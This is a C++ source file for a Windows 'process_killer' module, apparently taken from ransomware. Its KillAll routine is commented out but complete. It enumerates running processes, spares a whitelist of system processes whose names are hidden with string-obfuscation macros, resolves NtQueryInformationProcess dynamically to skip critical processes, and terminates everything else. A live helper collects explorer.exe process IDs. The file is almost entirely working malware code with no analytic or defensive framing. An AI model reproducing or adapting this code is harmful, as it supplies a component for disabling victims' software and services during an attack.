#include "process_killer.h"
#include <TlHelp32.h>
#include <winternl.h>
#include "api.h"

VOID
process_killer::KillAll(__out PPID_LIST PidList)
{
	/*
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapShot == NULL) {
		return;
	}

	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32W);

	if (!Process32FirstW(hSnapShot, &pe32)) {

		pCloseHandle(hSnapShot);
		return;

	}

	do
	{
		LPCWSTR WhitelistNames[] =
		{

			OBFW(L"spoolsv.exe"),
			OBFW(L"explorer.exe"),
			OBFW(L"sihost.exe"),
			OBFW(L"fontdrvhost.exe"),
			OBFW(L"cmd.exe"),
			OBFW(L"dwm.exe"),
			OBFW(L"LogonUI.exe"),
			OBFW(L"SearchUI.exe"),
			OBFW(L"lsass.exe"),
			OBFW(L"csrss.exe"),
			OBFW(L"smss.exe"),
			OBFW(L"winlogon.exe"),
			OBFW(L"services.exe"),
			OBFW(L"conhost.exe")

		};


		BOOL FoundPid = FALSE;
		PPID Pid = NULL;
		TAILQ_FOREACH(Pid, PidList, Entries) {
			if (Pid->dwProcessId == pe32.th32ProcessID) {
				
				FoundPid = TRUE;
				break;

			}
		}

		BOOL FoundName = FALSE;
		INT Count = sizeof(WhitelistNames) / sizeof(LPCWSTR);
		for (INT i = 0; i < Count; i++) {
			if (!plstrcmpiW(pe32.szExeFile, WhitelistNames[i])) {

				FoundName = TRUE;
				break;

			}
		}

		if (FoundPid || FoundName || pe32.th32ProcessID == pGetProcessId(pGetCurrentProcess())) {
			continue;
		}

		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
		if (hProcess) {

			HMODULE hNtdll = LoadLibraryA(OBFA("ntdll.dll"));
			NTSTATUS(WINAPI * pFunction)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
			pFunction = (NTSTATUS(WINAPI*)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtdll, OBFA("NtQueryInformationProcess"));

			ULONG IsCriticalProcess;
			ULONG Size;
			NTSTATUS Status = pFunction(hProcess, ProcessBreakOnTermination, &IsCriticalProcess, sizeof(ULONG), &Size);

			if (!IsCriticalProcess) {
				TerminateProcess(hProcess, EXIT_SUCCESS);
			}

			pCloseHandle(hProcess);

		}


	} while (Process32NextW(hSnapShot, &pe32));

	pCloseHandle(hSnapShot);
	*/
}

VOID 
process_killer::GetWhiteListProcess(__out PPID_LIST PidList)
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapShot == NULL) {
		return;
	}

	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32W);

	if (!Process32FirstW(hSnapShot, &pe32)) {

		pCloseHandle(hSnapShot);
		return;

	}

	do
	{

		if (!plstrcmpiW(pe32.szExeFile, OBFW(L"explorer.exe"))) {

			PPID Pid = (PPID)m_malloc(sizeof(PPID));
			if (!Pid) {
				break;
			}

			Pid->dwProcessId = pe32.th32ProcessID;
			TAILQ_INSERT_TAIL(PidList, Pid, Entries);

		}

	} while (Process32NextW(hSnapShot, &pe32));

	pCloseHandle(hSnapShot);

}